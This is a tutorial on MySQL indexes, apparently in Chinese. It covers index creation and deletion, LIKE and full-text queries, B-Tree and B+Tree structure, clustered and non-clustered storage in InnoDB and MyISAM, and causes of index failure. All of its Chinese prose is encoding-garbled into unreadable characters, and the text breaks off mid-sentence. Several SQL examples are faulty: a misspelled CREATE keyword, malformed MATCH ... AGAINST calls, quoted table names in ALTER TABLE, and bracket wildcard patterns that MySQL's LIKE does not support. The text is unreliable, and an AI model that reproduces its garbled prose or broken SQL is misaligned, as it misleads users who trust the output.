åå»ºç´¢å¼\n\nå¨åå»ºè¡¨çæ¶åæ·»å ç´¢å¼\n\nCREATE TABLE mytable(  \n    ID INT NOT NULL,   \n    username VARCHAR(16) NOT NULL,  \n    INDEX [indexName] (username(length))  \n); \n\n\n1\n2\n3\n4\n5\n\n\nå¨åå»ºè¡¨ä»¥åæ·»å ç´¢å¼\n\nALTER TABLE my_table ADD [UNIQUE] INDEX index_name(column_name);\n# æè\nCREATE INDEX index_name ON my_table(column_name);\n\n\n1\n2\n3\n\n\n\n# æ³¨æï¼\n\n 1. ç´¢å¼éè¦å ç¨ç£çç©ºé´ï¼å æ­¤å¨åå»ºç´¢å¼æ¶è¦èèå°ç£çç©ºé´æ¯å¦è¶³å¤\n 2. åå»ºç´¢å¼æ¶éè¦å¯¹è¡¨å éï¼å æ­¤å®éæä½ä¸­éè¦å¨ä¸å¡ç©ºé²æé´è¿è¡\n\n\n# æ ¹æ®ç´¢å¼æ¥è¯¢\n\n--å·ä½æ¥è¯¢ï¼\nSELECT * FROM table_name WHERE column_1=column_2;(ä¸ºcolumn_1å»ºç«äºç´¢å¼)\n\n--æèæ¨¡ç³æ¥è¯¢\nSELECT * FROM table_name WHERE column_1 LIKE '%ä¸'\nSELECT * FROM table_name WHERE column_1 LIKE 'ä¸%'\nSELECT * FROM table_name WHERE column_1 LIKE '%ä¸%'\n\nSELECT * FROM table_name WHERE column_1 LIKE '_å¥½_'\n\n--å¦æè¦è¡¨ç¤ºå¨å­ç¬¦ä¸²ä¸­æ¢æAåæBï¼é£ä¹æ¥è¯¢è¯­å¥ä¸ºï¼\nSELECT * FROM table_name WHERE column_1 LIKE '%A%' AND column_1 LIKE '%B%';\n\nSELECT * FROM table_name WHERE column_1 LIKE '[å¼ æç]ä¸';  --è¡¨ç¤ºcolumn_1ä¸­æå¹éå¼ ä¸ãæä¸ãçä¸çé½å¯ä»¥\nSELECT * FROM table_name WHERE column_1 LIKE '[^å¼ æç]ä¸';  --è¡¨ç¤ºcolumn_1ä¸­æå¹éé¤äºå¼ ä¸ãæä¸ãçä¸çå¶ä»ä¸é½å¯ä»¥\n\n-- å¨æ¨¡ç³æ¥è¯¢ä¸­ï¼%è¡¨ç¤ºä»»æ0ä¸ªæå¤ä¸ªå­ç¬¦ï¼_è¡¨ç¤ºä»»æåä¸ªå­ç¬¦ï¼æä¸ä»æï¼ï¼éå¸¸ç¨æ¥éå¶å­ç¬¦ä¸²é¿åº¦;[]è¡¨ç¤ºå¶ä¸­çæä¸ä¸ªå­ç¬¦ï¼[^]è¡¨ç¤ºé¤äºå¶ä¸­çå­ç¬¦çææå­ç¬¦\n\n--æèå¨å¨æç´¢å¼ä¸­æ¨¡ç³æ¥è¯¢\nSELECT * FROM table_name WHERE MATCH(content) AGAINST('word1','word2',...);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# å é¤ç´¢å¼\n\nDROP INDEX my_index ON tablename;\n--æè\nALTER TABLE table_name DROP INDEX index_name;\n\n\n1\n2\n3\n\n\n\n# æ¥çè¡¨ä¸­çç´¢å¼\n\nSHOW INDEX FROM tablename\n\n\n1\n\n\n\n# æ¥çæ¥è¯¢è¯­å¥ä½¿ç¨ç´¢å¼çæåµ\n\n-- explain æ¥è¯¢è¯­å¥\nexplain SELECT * FROM table_name WHERE column_1='123';\n\n\n1\n2\n\n\n\n# ç´¢å¼çä¼ç¼ºç¹\n\nä¼å¿ï¼å¯ä»¥å¿«éæ£ç´¢ï¼åå° I/O æ¬¡æ°ï¼å å¿«æ£ç´¢éåº¦ï¼æ ¹æ®ç´¢å¼åç»åæåºï¼å¯ä»¥å å¿«åç»åæåºï¼\n\nå£å¿ï¼ç´¢å¼æ¬èº«ä¹æ¯è¡¨ï¼å æ­¤ä¼å ç¨å­å¨ç©ºé´ï¼ä¸è¬æ¥è¯´ï¼ç´¢å¼è¡¨å ç¨çç©ºé´çæ°æ®è¡¨ç 1.5 åï¼ç´¢å¼è¡¨çç»´æ¤ååå»ºéè¦æ¶é´ææ¬ï¼è¿ä¸ªææ¬éçæ°æ®éå¢å¤§èå¢å¤§ï¼æå»ºç´¢å¼ä¼éä½æ°æ®è¡¨çä¿®æ¹æä½ï¼å é¤ï¼æ·»å ï¼ä¿®æ¹ï¼çæçï¼å ä¸ºå¨ä¿®æ¹æ°æ®è¡¨çåæ¶è¿éè¦ä¿®æ¹ç´¢å¼è¡¨ï¼\n\n\n# ç´¢å¼çåç±»\n\n\n# å¸¸è§çç´¢å¼ç±»åæï¼ä¸»é®ç´¢å¼ãå¯ä¸ç´¢å¼ãæ®éç´¢å¼ãå¨æç´¢å¼ãç»åç´¢å¼\n\n1ãä¸»é®ç´¢å¼ï¼å³ä¸»ç´¢å¼ï¼æ ¹æ®ä¸»é® pk_clolumï¼lengthï¼å»ºç«ç´¢å¼ï¼ä¸åè®¸éå¤ï¼ä¸åè®¸ç©ºå¼ï¼\n\nALTER TABLE 'table_name' ADD PRIMARY KEY pk_index('col');\n\n\n1\n\n\n2ãå¯ä¸ç´¢å¼ï¼ç¨æ¥å»ºç«ç´¢å¼çåçå¼å¿é¡»æ¯å¯ä¸çï¼åè®¸ç©ºå¼\n\nALTER TABLE 'table_name' ADD UNIQUE index_name('col');\n\n\n1\n\n\n3ãæ®éç´¢å¼ï¼ç¨è¡¨ä¸­çæ®éåæå»ºçç´¢å¼ï¼æ²¡æä»»ä½éå¶\n\nALTER TABLE 'table_name' ADD INDEX index_name('col');\n\n\n1\n\n\n4ãå¨æç´¢å¼ï¼ç¨å¤§ææ¬å¯¹è±¡çåæå»ºçç´¢å¼ï¼ä¸ä¸é¨åä¼è®²è§£ï¼\n\nALTER TABLE 'table_name' ADD FULLTEXT INDEX ft_index('col');\n\n\n1\n\n\n5ãç»åç´¢å¼ï¼ç¨å¤ä¸ªåç»åæå»ºçç´¢å¼ï¼è¿å¤ä¸ªåä¸­çå¼ä¸åè®¸æç©ºå¼\n\nALTER TABLE 'table_name' ADD INDEX index_name('col1','col2','col3');\n\n\n1\n\n * éµå¾ª âæå·¦åç¼â ååï¼ææå¸¸ç¨ä½ä¸ºæ£ç´¢ææåºçåæ¾å¨æå·¦ï¼ä¾æ¬¡éåï¼ç»åç´¢å¼ç¸å½äºå»ºç«äº col1,col1col2,col1col2col3 ä¸ä¸ªç´¢å¼ï¼è col2 æè col3 æ¯ä¸è½ä½¿ç¨ç´¢å¼çã\n * å¨ä½¿ç¨ç»åç´¢å¼çæ¶åå¯è½å ä¸ºååé¿åº¦è¿é¿èå¯¼è´ç´¢å¼ç key å¤ªå¤§ï¼å¯¼è´æçéä½ï¼å¨åè®¸çæåµä¸ï¼å¯ä»¥åªå col1 å col2 çåå ä¸ªå­ç¬¦ä½ä¸ºç´¢å¼\n * ALTER TABLE 'table_name' ADD INDEX index_name(col1(4),col2(3))ï¼\n   è¡¨ç¤ºä½¿ç¨ col1 çå 4 ä¸ªå­ç¬¦å col2 çå 3 ä¸ªå­ç¬¦ä½ä¸ºç´¢å¼\n\n\n# ç´¢å¼çå®ç°åç\n\nMySQL æ¯æè¯¸å¤å­å¨å¼æï¼èåç§å­å¨å¼æå¯¹ç´¢å¼çæ¯æä¹åä¸ç¸åï¼å æ­¤ MySQL æ°æ®åºæ¯æå¤ç§ç´¢å¼ç±»åï¼å¦ BTree ç´¢å¼ï¼B+Tree ç´¢å¼ï¼åå¸ç´¢å¼ï¼å¨æç´¢å¼ç­ç­ï¼\n\n\n# åå¸ç´¢å¼ï¼\n\nåªæ memoryï¼åå­ï¼å­å¨å¼ææ¯æåå¸ç´¢å¼ï¼åå¸ç´¢å¼ç¨ç´¢å¼åçå¼è®¡ç®è¯¥å¼ç hashCodeï¼ç¶åå¨ hashCode ç¸åºçä½ç½®å­æ§è¯¥å¼æå¨è¡æ°æ®çç©çä½ç½®ï¼å ä¸ºä½¿ç¨æ£åç®æ³ï¼å æ­¤è®¿é®éåº¦éå¸¸å¿«ï¼ä½æ¯ä¸ä¸ªå¼åªè½å¯¹åºä¸ä¸ª hashCodeï¼èä¸æ¯æ£åçåå¸æ¹å¼ï¼å æ­¤åå¸ç´¢å¼ä¸æ¯æèå´æ¥æ¾åæåºçåè½ã\n\n\n# å¨æç´¢å¼ï¼\n\nFULLTEXTï¼å¨æï¼ç´¢å¼ï¼ä»å¯ç¨äº MyISAM å InnoDBï¼éå¯¹è¾å¤§çæ°æ®ï¼çæå¨æç´¢å¼éå¸¸çæ¶èæ¶é´åç©ºé´ãå¯¹äºææ¬çå¤§å¯¹è±¡ï¼æèè¾å¤§ç CHAR ç±»åçæ°æ®ï¼å¦æä½¿ç¨æ®éç´¢å¼ï¼é£ä¹å¹éææ¬åå ä¸ªå­ç¬¦è¿æ¯å¯è¡çï¼ä½æ¯æ³è¦å¹éææ¬ä¸­é´çå ä¸ªåè¯ï¼é£ä¹å°±è¦ä½¿ç¨ LIKE % word% æ¥å¹éï¼è¿æ ·éè¦å¾é¿çæ¶é´æ¥å¤çï¼ååºæ¶é´ä¼å¤§å¤§å¢å ï¼è¿ç§æåµï¼å°±å¯ä½¿ç¨æ¶ FULLTEXT ç´¢å¼äºï¼å¨çæ FULLTEXT ç´¢å¼æ¶ï¼ä¼ä¸ºææ¬çæä¸ä»½åè¯çæ¸åï¼å¨ç´¢å¼æ¶åæ ¹æ®è¿ä¸ªåè¯çæ¸åæ¥ç´¢å¼ãFULLTEXT å¯ä»¥å¨åå»ºè¡¨çæ¶ååå»ºï¼ä¹å¯ä»¥å¨éè¦çæ¶åç¨ ALTER æè CREATE INDEX æ¥æ·»å ï¼\n\n--åå»ºè¡¨çæ¶åæ·»å FULLTEXTç´¢å¼\nCTREATE TABLE my_table(\n    id INT(10) PRIMARY KEY,\n    name VARCHAR(10) NOT NULL,\n    my_text TEXT,\n    FULLTEXT(my_text)\n)ENGINE=MyISAM DEFAULT CHARSET=utf8;\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n--åå»ºè¡¨ä»¥åï¼å¨éè¦çæ¶åæ·»å FULLTEXTç´¢å¼\nALTER TABLE my_table ADD FULLTEXT INDEX ft_index(column_name);\n\n\n1\n2\n\n\nå¨æç´¢å¼çæ¥è¯¢ä¹æèªå·±ç¹æ®çè¯­æ³ï¼èä¸è½ä½¿ç¨ LIKE % æ¥è¯¢å­ç¬¦ä¸² % çæ¨¡ç³æ¥è¯¢è¯­æ³\n\nSELECT * FROM table_name MATCH(ft_index) AGAINST('æ¥è¯¢å­ç¬¦ä¸²');\n\n\n1\n\n\n\n# æ³¨æï¼\n\n * å¯¹äºè¾å¤§çæ°æ®éï¼ææ°æ®æ·»å å°ä¸ä¸ªæ²¡æ FULLTEXT ç´¢å¼çè¡¨ï¼ç¶åæ·»å  FULLTEXT ç´¢å¼çéåº¦æ¯ææ°æ®æ·»å å°ä¸ä¸ªå·²ç»æ FULLTEXT ç´¢å¼çè¡¨å¿«ã\n\n * 5.6 çæ¬åç MySQL èªå¸¦çå¨æç´¢å¼åªè½ç¨äº MyISAM å­å¨å¼æï¼å¦ææ¯å¶å®æ°æ®å¼æï¼é£ä¹å¨æç´¢å¼ä¸ä¼çæã5.6 çæ¬ä¹å InnoDB å­å¨å¼æå¼å§æ¯æå¨æç´¢å¼\n\n * å¨ MySQL ä¸­ï¼å¨æç´¢å¼æ¯éè±ææç¨ï¼ç®åå¯¹ä¸­æè¿ä¸æ¯æã5.7 çæ¬ä¹åéè¿ä½¿ç¨ ngram æä»¶å¼å§æ¯æä¸­æã\n\n * å¨ MySQL ä¸­ï¼å¦ææ£ç´¢çå­ç¬¦ä¸²å¤ªç­åæ æ³æ£ç´¢å¾å°é¢æçç»æï¼æ£ç´¢çå­ç¬¦ä¸²é¿åº¦è³å°ä¸º 4 å­èï¼æ­¤å¤ï¼å¦ææ£ç´¢çå­ç¬¦åæ¬åæ­¢è¯ï¼é£ä¹åæ­¢è¯ä¼è¢«å¿½ç¥ã\n\n\n# BTree ç´¢å¼å B+Tree ç´¢å¼\n\n1ãBTree ç´¢å¼\nBTree æ¯å¹³è¡¡æç´¢å¤åæ ï¼è®¾æ çåº¦ä¸º 2dï¼d>1ï¼ï¼é«åº¦ä¸º hï¼é£ä¹ BTree è¦æ»¡è¶³ä»¥ä¸ä¸æ¡ä»¶ï¼\n\n * æ¯ä¸ªå¶å­ç»ç¹çé«åº¦ä¸æ ·ï¼ç­äº hï¼\n * æ¯ä¸ªéå¶å­ç»ç¹ç± n-1 ä¸ª key å n ä¸ªæé point ç»æï¼å¶ä¸­ d<=n<=2d,key å point ç¸äºé´éï¼ç»ç¹ä¸¤ç«¯ä¸å®æ¯ keyï¼\n * å¶å­ç»ç¹æéé½ä¸º nullï¼\n * éå¶å­ç»ç¹ç key é½æ¯ [key,data] äºåç»ï¼å¶ä¸­ key è¡¨ç¤ºä½ä¸ºç´¢å¼çé®ï¼data ä¸ºé®å¼æå¨è¡çæ°æ®ï¼\n   ç»æå¦ä¸ï¼\n\n\n\nå¨ BTree çæºæä¸ï¼å°±å¯ä»¥ä½¿ç¨äºåæ¥æ¾çæ¥æ¾æ¹å¼ï¼æ¥æ¾å¤æåº¦ä¸º h*log (n)ï¼ä¸è¬æ¥è¯´æ çé«åº¦æ¯å¾å°çï¼ä¸è¬ä¸º 3 å·¦å³ï¼å æ­¤ BTree æ¯ä¸ä¸ªéå¸¸é«æçæ¥æ¾ç»æã\n\n2ãB+Tree ç´¢å¼\nB+Tree æ¯ BTree çä¸ä¸ªåç§ï¼è®¾ d ä¸ºæ çåº¦æ°ï¼h ä¸ºæ çé«åº¦ï¼B+Tree å BTree çä¸åä¸»è¦å¨äºï¼\n\n * B+Tree ä¸­çéå¶å­ç»ç¹ä¸å­å¨æ°æ®ï¼åªå­å¨é®å¼ï¼\n * B+Tree çå¶å­ç»ç¹æ²¡ææéï¼ææé®å¼é½ä¼åºç°å¨å¶å­ç»ç¹ä¸ï¼ä¸ key å­å¨çé®å¼å¯¹åº data æ°æ®çç©çå°åï¼\n * B+Tree çæ¯ä¸ªéå¶å­èç¹ç± n ä¸ªé®å¼ key å n ä¸ªæé point ç»æï¼\n   B+Tree çç»æå¦ä¸ï¼\n\n\n\nB+Tree å¯¹æ¯ BTree çä¼ç¹ï¼\n\n * ç£çè¯»åä»£ä»·æ´ä½\n   ä¸è¬æ¥è¯´ B+Tree æ¯ BTree æ´éåå®ç°å¤å­çç´¢å¼ç»æï¼å ä¸ºå­å¨å¼æçè®¾è®¡ä¸å®¶å·§å¦çå©ç¨äºå¤å­ï¼ç£çï¼çå­å¨ç»æï¼å³ç£ççæå°å­å¨åä½æ¯æåºï¼sectorï¼ï¼èæä½ç³»ç»çåï¼blockï¼éå¸¸æ¯æ´æ°åç sectorï¼æä½ç³»ç»ä»¥é¡µï¼pageï¼ä¸ºåä½ç®¡çåå­ï¼ä¸é¡µï¼pageï¼éå¸¸é»è®¤ä¸º 4Kï¼æ°æ®åºçé¡µéå¸¸è®¾ç½®ä¸ºæä½ç³»ç»é¡µçæ´æ°åï¼å æ­¤ç´¢å¼ç»æçèç¹è¢«è®¾è®¡ä¸ºä¸ä¸ªé¡µçå¤§å°ï¼ç¶åå©ç¨å¤å­ç âé¢è¯»åâ ååï¼æ¯æ¬¡è¯»åçæ¶åï¼ææ´ä¸ªèç¹çæ°æ®è¯»åå°åå­ä¸­ï¼ç¶åå¨åå­ä¸­æ¥æ¾ï¼å·²ç¥åå­çè¯»åéåº¦æ¯å¤å­è¯»å I/O éåº¦çå ç¾åï¼é£ä¹æåæ¥æ¾éåº¦çå³é®å°±å¨äºå°½å¯è½å°çç£ç I/Oï¼é£ä¹å¯ä»¥ç¥éï¼æ¯ä¸ªèç¹ä¸­ç key ä¸ªæ°è¶å¤ï¼é£ä¹æ çé«åº¦è¶å°ï¼éè¦ I/O çæ¬¡æ°è¶å°ï¼å æ­¤ä¸è¬æ¥è¯´ B+Tree æ¯ BTree æ´å¿«ï¼å ä¸º B+Tree çéå¶èç¹ä¸­ä¸å­å¨ dataï¼å°±å¯ä»¥å­å¨æ´å¤ç keyã\n\n * æ¥è¯¢éåº¦æ´ç¨³å®\n   ç±äº B+Tree éå¶å­èç¹ä¸å­å¨æ°æ®ï¼dataï¼ï¼å æ­¤ææçæ°æ®é½è¦æ¥è¯¢è³å¶å­èç¹ï¼èå¶å­èç¹çé«åº¦é½æ¯ç¸åçï¼å æ­¤æææ°æ®çæ¥è¯¢éåº¦é½æ¯ä¸æ ·çã\n   æ´å¤æä½ç³»ç»åå®¹åèï¼\n   ç¡¬çç»æ\n   æåºãåãç°ãé¡µçåºå«\n   æä½ç³»ç»å±ä¼åï¼è¿é¶ï¼åå­¦ä¸ç¨çï¼\n\nå¸¦é¡ºåºç´¢å¼ç B+TREEï¼\nå¾å¤å­å¨å¼æå¨ B+Tree çåºç¡ä¸è¿è¡äºä¼åï¼æ·»å äºæåç¸é»å¶èç¹çæéï¼å½¢æäºå¸¦æé¡ºåºè®¿é®æéç B+Treeï¼è¿æ ·åæ¯ä¸ºäºæé«åºé´æ¥æ¾çæçï¼åªè¦æ¾å°ç¬¬ä¸ä¸ªå¼é£ä¹å°±å¯ä»¥é¡ºåºçæ¥æ¾åé¢çå¼\nB+Tree çç»æå¦ä¸ï¼\n\n\n\n3ãèç°ç´¢å¼åéèç°ç´¢å¼\nåæäº MySQL çç´¢å¼ç»æçå®ç°åçï¼ç¶åæä»¬æ¥ççå·ä½çå­å¨å¼ææä¹å®ç°ç´¢å¼ç»æçï¼MySQL ä¸­æå¸¸è§çä¸¤ç§å­å¨å¼æåå«æ¯ MyISAM å InnoDBï¼åå«å®ç°äºéèç°ç´¢å¼åèç°ç´¢å¼ã\n\nèç°ç´¢å¼çè§£éæ¯ï¼èç°ç´¢å¼çé¡ºåºå°±æ¯æ°æ®çç©çå­å¨é¡ºåº\n\néèç°ç´¢å¼çè§£éæ¯ï¼ç´¢å¼é¡ºåºä¸æ°æ®ç©çæåé¡ºåºæ å³\n\nï¼è¿æ ·è¯´èµ·æ¥å¹¶ä¸å¥½çè§£ï¼è®©äººæ¸ä¸çå¤´èï¼æ¸ç»§ç»­çä¸æï¼å¹¶å¨æå¾ä¸æ¹å¯¹ä¸è¿°ä¸¤å¥è¯æè§£éï¼\n\né¦åè¦ä»ç»å ä¸ªæ¦å¿µï¼å¨ç´¢å¼çåç±»ä¸­ï¼æä»¬å¯ä»¥æç§ç´¢å¼çé®æ¯å¦ä¸ºä¸»é®æ¥åä¸º âä¸»ç´¢å¼â å âè¾å©ç´¢å¼âï¼ä½¿ç¨ä¸»é®é®å¼å»ºç«çç´¢å¼ç§°ä¸º âä¸»ç´¢å¼âï¼å¶å®çç§°ä¸º âè¾å©ç´¢å¼âãå æ­¤ä¸»ç´¢å¼åªè½æä¸ä¸ªï¼è¾å©ç´¢å¼å¯ä»¥æå¾å¤ä¸ªã\n\n4ãMyISAMââ éèç°ç´¢å¼\n\n * MyISAM å­å¨å¼æéç¨çæ¯éèç°ç´¢å¼ï¼éèç°ç´¢å¼çä¸»ç´¢å¼åè¾å©ç´¢å¼å ä¹æ¯ä¸æ ·çï¼åªæ¯ä¸»ç´¢å¼ä¸åè®¸éå¤ï¼ä¸åè®¸ç©ºå¼ï¼ä»ä»¬çå¶å­ç»ç¹ç key é½å­å¨æåé®å¼å¯¹åºçæ°æ®çç©çå°åã\n * éèç°ç´¢å¼çæ°æ®è¡¨åç´¢å¼è¡¨æ¯åå¼å­å¨çã\n * éèç°ç´¢å¼ä¸­çæ°æ®æ¯æ ¹æ®æ°æ®çæå¥é¡ºåºä¿å­ãå æ­¤éèç°ç´¢å¼æ´éååä¸ªæ°æ®çæ¥è¯¢ãæå¥é¡ºåºä¸åé®å¼å½±åã\n * åªæå¨ MyISAM ä¸­æè½ä½¿ç¨ FULLTEXT ç´¢å¼ã(mysql5.6 ä»¥å innoDB ä¹æ¯æå¨æç´¢å¼)\n\næå¼å§æä¸ç´ä¸ææ¢ç¶éèç°ç´¢å¼çä¸»ç´¢å¼åè¾å©ç´¢å¼æåç¸åçåå®¹ï¼ä¸ºä»ä¹è¿è¦è¾å©ç´¢å¼è¿ä¸ªä¸è¥¿å¢ï¼åæ¥ææç½ç´¢å¼ä¸å°±æ¯ç¨æ¥æ¥è¯¢çåï¼ç¨å¨é£äºå°æ¹å¢ï¼ä¸å°±æ¯ WHERE å ORDER BY è¯­å¥åé¢åï¼é£ä¹å¦ææ¥è¯¢çæ¡ä»¶ä¸æ¯ä¸»é®æä¹åå¢ï¼è¿ä¸ªæ¶åå°±éè¦è¾å©ç´¢å¼äºã\n\n5ãInnoDBââ èç°ç´¢å¼\n\n * èç°ç´¢å¼çä¸»ç´¢å¼çå¶å­ç»ç¹å­å¨çæ¯é®å¼å¯¹åºçæ°æ®æ¬èº«ï¼è¾å©ç´¢å¼çå¶å­ç»ç¹å­å¨çæ¯é®å¼å¯¹åºçæ°æ®çä¸»é®é®å¼ãå æ­¤ä¸»é®çå¼é¿åº¦è¶å°è¶å¥½ï¼ç±»åè¶ç®åè¶å¥½ã\n * èç°ç´¢å¼çæ°æ®åä¸»é®ç´¢å¼å­å¨å¨ä¸èµ·ã\n * èç°ç´¢å¼çæ°æ®æ¯æ ¹æ®ä¸»é®çé¡ºåºä¿å­ãå æ­¤éåæä¸»é®ç´¢å¼çåºé´æ¥æ¾ï¼å¯ä»¥ææ´å°çç£ç I/Oï¼å å¿«æ¥è¯¢éåº¦ãä½æ¯ä¹æ¯å ä¸ºè¿ä¸ªåå ï¼èç°ç´¢å¼çæå¥é¡ºåºæå¥½æç§ä¸»é®åè°çé¡ºåºæå¥ï¼å¦åä¼é¢ç¹çå¼èµ·é¡µåè£ï¼ä¸¥éå½±åæ§è½ã\n * å¨ InnoDB ä¸­ï¼å¦æåªéè¦æ¥æ¾ç´¢å¼çåï¼å°±å°½éä¸è¦å å¥å¶å®çåï¼è¿æ ·ä¼æé«æ¥è¯¢æçã\n   ä½¿ç¨ä¸»ç´¢å¼çæ¶åï¼æ´éåä½¿ç¨èç°ç´¢å¼ï¼å ä¸ºèç°ç´¢å¼åªéè¦æ¥æ¾ä¸æ¬¡ï¼èéèç°ç´¢å¼å¨æ¥å°æ°æ®çå°ååï¼è¿è¦è¿è¡ä¸æ¬¡ I/O æ¥æ¾æ°æ®ã\n\nå ä¸ºèç°è¾å©ç´¢å¼å­å¨çæ¯ä¸»é®çé®å¼ï¼å æ­¤å¯ä»¥å¨æ°æ®è¡ç§»å¨æèé¡µåè£çæ¶åéä½ææ¬ï¼å ä¸ºè¿æ¶ä¸ç¨ç»´æ¤è¾å©ç´¢å¼ãä½æ¯ç±äºä¸»ç´¢å¼å­å¨çæ¯æ°æ®æ¬èº«ï¼å æ­¤èç°ç´¢å¼ä¼å ç¨æ´å¤çç©ºé´ã\n\nèç°ç´¢å¼å¨æå¥æ°æ°æ®çæ¶åæ¯éèç°ç´¢å¼æ¢å¾å¤ï¼å ä¸ºæå¥æ°æ°æ®æ¶éè¦æ£æµä¸»é®æ¯å¦éå¤ï¼è¿éè¦éåä¸»ç´¢å¼çææå¶èç¹ï¼èéèç°ç´¢å¼çå¶èç¹ä¿å­çæ¯æ°æ®å°åï¼å ç¨ç©ºé´å°ï¼å æ­¤åå¸éä¸­ï¼æ¥è¯¢çæ¶å I/O æ´å°ï¼ä½èç°ç´¢å¼çä¸»ç´¢å¼ä¸­å­å¨çæ¯æ°æ®æ¬èº«ï¼æ°æ®å ç¨ç©ºé´å¤§ï¼åå¸èå´æ´å¤§ï¼å¯è½å ç¨å¥½å¤çæåºï¼å æ­¤éè¦æ´å¤æ¬¡ I/O æè½éåå®æ¯ã\n\nä¸å¾å¯ä»¥å½¢è±¡çè¯´æèç°ç´¢å¼åéèç°ç´¢å¼çåºå«ï¼\n\n\n\nä»ä¸å¾ä¸­å¯ä»¥çå°èç°ç´¢å¼çè¾å©ç´¢å¼çå¶å­èç¹ç data å­å¨çæ¯ä¸»é®çå¼ï¼ä¸»ç´¢å¼çå¶å­èç¹ç data å­å¨çæ¯æ°æ®æ¬èº«ï¼ä¹å°±æ¯è¯´æ°æ®åç´¢å¼å­å¨å¨ä¸èµ·ï¼å¹¶ä¸ç´¢å¼æ¥è¯¢å°çå°æ¹å°±æ¯æ°æ®ï¼dataï¼æ¬èº«ï¼é£ä¹ç´¢å¼çé¡ºåºåæ°æ®æ¬èº«çé¡ºåºå°±æ¯ç¸åçï¼\n\nèéèç°ç´¢å¼çä¸»ç´¢å¼åè¾å©ç´¢å¼çå¶å­èç¹ç data é½æ¯å­å¨çæ°æ®çç©çå°åï¼ä¹å°±æ¯è¯´ç´¢å¼åæ°æ®å¹¶ä¸æ¯å­å¨å¨ä¸èµ·çï¼æ°æ®çé¡ºåºåç´¢å¼çé¡ºåºå¹¶æ²¡æä»»ä½å³ç³»ï¼ä¹å°±æ¯ç´¢å¼é¡ºåºä¸æ°æ®ç©çæåé¡ºåºæ å³ã\n\næ­¤å¤ MyISAM å innoDB çåºå«æ»ç»å¦ä¸ï¼\n\n\n\n6ãæ»ç»\n\n * InnoDB æ¯æäºå¡ï¼æ¯æè¡çº§å«éå®ï¼æ¯æ B-treeãFull-text ç­ç´¢å¼ï¼ä¸æ¯æ Hash ç´¢å¼ï¼\n * MyISAM ä¸æ¯æäºå¡ï¼æ¯æè¡¨çº§å«éå®ï¼æ¯æ B-treeãFull-text ç­ç´¢å¼ï¼ä¸æ¯æ Hash ç´¢å¼ï¼\n   æ­¤å¤ï¼Memory ä¸æ¯æäºå¡ï¼æ¯æè¡¨çº§å«éå®ï¼æ¯æ B-treeãHash ç­ç´¢å¼ï¼ä¸æ¯æ Full-text ç´¢å¼ï¼\n\n\n# ç´¢å¼çä½¿ç¨ç­ç¥\n\n\n# ä»ä¹æ¶åè¦ä½¿ç¨ç´¢å¼ï¼\n\n * ä¸»é®èªå¨å»ºç«å¯ä¸ç´¢å¼ï¼\n * ç»å¸¸ä½ä¸ºæ¥è¯¢æ¡ä»¶å¨ WHERE æè ORDER BY è¯­å¥ä¸­åºç°çåè¦å»ºç«ç´¢å¼ï¼\n * ä½ä¸ºæåºçåè¦å»ºç«ç´¢å¼ï¼\n * æ¥è¯¢ä¸­ä¸å¶ä»è¡¨å³èçå­æ®µï¼å¤é®å³ç³»å»ºç«ç´¢å¼\n * é«å¹¶åæ¡ä»¶ä¸å¾åç»åç´¢å¼ï¼\n * ç¨äºèåå½æ°çåå¯ä»¥å»ºç«ç´¢å¼ï¼ä¾å¦ä½¿ç¨äº max (column_1) æè count (column_1) æ¶ç column_1 å°±éè¦å»ºç«ç´¢å¼\n\n\n# ä»ä¹æ¶åä¸è¦ä½¿ç¨ç´¢å¼ï¼\n\n * ç»å¸¸å¢å æ¹çåä¸è¦å»ºç«ç´¢å¼ï¼\n * æå¤§ééå¤çåä¸å»ºç«ç´¢å¼ï¼\n * è¡¨è®°å½å¤ªå°ä¸è¦å»ºç«ç´¢å¼ãåªæå½æ°æ®åºéå·²ç»æäºè¶³å¤å¤çæµè¯æ°æ®æ¶ï¼å®çæ§è½æµè¯ç»æææå®éåèä»·å¼ãå¦æå¨æµè¯æ°æ®åºéåªæå ç¾æ¡æ°æ®è®°å½ï¼å®ä»¬å¾å¾å¨æ§è¡å®ç¬¬ä¸æ¡æ¥è¯¢å½ä»¤ä¹åå°±è¢«å¨é¨å è½½å°åå­éï¼è¿å°ä½¿åç»­çæ¥è¯¢å½ä»¤é½æ§è¡å¾éå¸¸å¿« -- ä¸ç®¡ææ²¡æä½¿ç¨ç´¢å¼ãåªæå½æ°æ®åºéçè®°å½è¶è¿äº 1000 æ¡ãæ°æ®æ»éä¹è¶è¿äº MySQL æå¡å¨ä¸çåå­æ»éæ¶ï¼æ°æ®åºçæ§è½æµè¯ç»ææææä¹ã\n\n\n# ç´¢å¼å¤±æçæåµï¼\n\n * å¨ç»åç´¢å¼ä¸­ä¸è½æåçå¼ä¸º NULLï¼å¦ææï¼é£ä¹è¿ä¸åå¯¹ç»åç´¢å¼å°±æ¯æ æçã\n\n * å¨ä¸ä¸ª SELECT è¯­å¥ä¸­ï¼ç´¢å¼åªè½ä½¿ç¨ä¸æ¬¡ï¼å¦æå¨ WHERE ä¸­ä½¿ç¨äºï¼é£ä¹å¨ ORDER BY ä¸­å°±ä¸è¦ç¨äºã\n\n * LIKE æä½ä¸­ï¼'% aaa%' ä¸ä¼ä½¿ç¨ç´¢å¼ï¼ä¹å°±æ¯ç´¢å¼ä¼å¤±æï¼ä½æ¯âaaa%âå¯ä»¥ä½¿ç¨ç´¢å¼ã\n\n * å¨ç´¢å¼çåä¸ä½¿ç¨è¡¨è¾¾å¼æèå½æ°ä¼ä½¿ç´¢å¼å¤±æï¼ä¾å¦ï¼select * from users where YEAR (adddate)<2007ï¼å°å¨æ¯ä¸ªè¡ä¸è¿è¡è¿ç®ï¼è¿å°å¯¼è´ç´¢å¼å¤±æèè¿è¡å¨è¡¨æ«æï¼å æ­¤æä»¬å¯ä»¥æ¹æï¼select * from users where adddate<â2007-01-01â²ãå¶å®ééç¬¦åæ ·ï¼ä¹å°±æ¯è¯´ï¼å¨æ¥è¯¢æ¡ä»¶ä¸­ä½¿ç¨æ­£åè¡¨è¾¾å¼æ¶ï¼åªæå¨æç´¢æ¨¡æ¿çç¬¬ä¸ä¸ªå­ç¬¦ä¸æ¯ééç¬¦çæåµä¸æè½ä½¿ç¨ç´¢å¼ã\n\n * å¨æ¥è¯¢æ¡ä»¶ä¸­ä½¿ç¨ä¸ç­äºï¼åæ¬ <ç¬¦å·ã> ç¬¦å·åï¼= 